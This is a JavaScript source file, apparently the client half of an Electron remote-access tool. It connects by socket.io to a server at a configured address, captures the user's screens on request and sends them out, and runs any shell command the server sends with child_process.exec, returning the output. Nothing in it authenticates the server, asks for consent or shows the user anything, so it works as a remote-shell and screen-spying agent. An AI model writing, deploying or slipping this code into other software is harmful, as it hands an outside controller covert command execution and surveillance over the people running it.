const { desktopCapturer, screen, ipcMain } = require('electron');
const io = require('socket.io-client');
const childProcess = require('child_process');
const info = require('./config');

class ElectronSide {
    constructor() {
        this.socket = null;
    }

    initialize(domain) {
        this.setupSocketConnection(domain);
    }

    setupSocketConnection(domain) {
        const targetAddress = `http://${domain}:${info.port}`;
        console.log({ targetAddress });
        this.socket = io.connect(targetAddress);

        this.socket.on('connect', () => {
            console.log(`socket.id: ${this.socket.id}`);
            this.joinRoom();
        });

        this.socket.on('screenshotRequest', (data) => {
            this.handleScreenshotRequest(data);
        });

        this.socket.on('getRunRequest', (data) => {
            this.handleCommandExecution(data);
        });
    }

    async handleScreenshotRequest(data) {
        try {
            const sources = await this.captureScreen(data);
            const response = {
                ...data,
                src: sources[data.screen].thumbnail.toDataURL()
            };
            this.socket.emit('screenshotResponse', response);
        } catch (error) {
            console.error('Screenshot capture failed:', error);
        }
    }

    async captureScreen(data) {
        const [width, height] = data.dimension.split('x').map(Number);
        return desktopCapturer.getSources({
            types: ['screen'],
            thumbnailSize: { width, height }
        });
    }

    calculateMousePosition(data) {
        try {
            const display = screen.getAllDisplays()[data.screen].size;
            return {
                x: data.mousePosition.x * (display.width / data.webScreen.width),
                y: data.mousePosition.y * (display.height / data.webScreen.height)
            };
        } catch (error) {
            console.error('Position calculation failed:', error);
            return { x: 0, y: 0 };
        }
    }

    joinRoom() {
        this.socket.emit('joinToRoom', {
            roomName: `terminal-${info.id}`
        });
    }

    handleCommandExecution(data) {
        try {
            childProcess.exec(data.cmd, { shell: true }, (error, stdout, stderr) => {
                const response = { ...data };

                if (error) {
                    response.cmd = `Error: ${error.message}`;
                } else if (stderr) {
                    response.cmd = `Command error: ${stderr}`;
                } else {
                    response.cmd = stdout;
                }

                this.socket.emit('getRunResponse', response);
            });
        } catch (error) {
            const response = {
                ...data,
                cmd: `Execution error: ${error.message}`
            };
            this.socket.emit('getRunResponse', response);
        }
    }
}

module.exports = ElectronSide;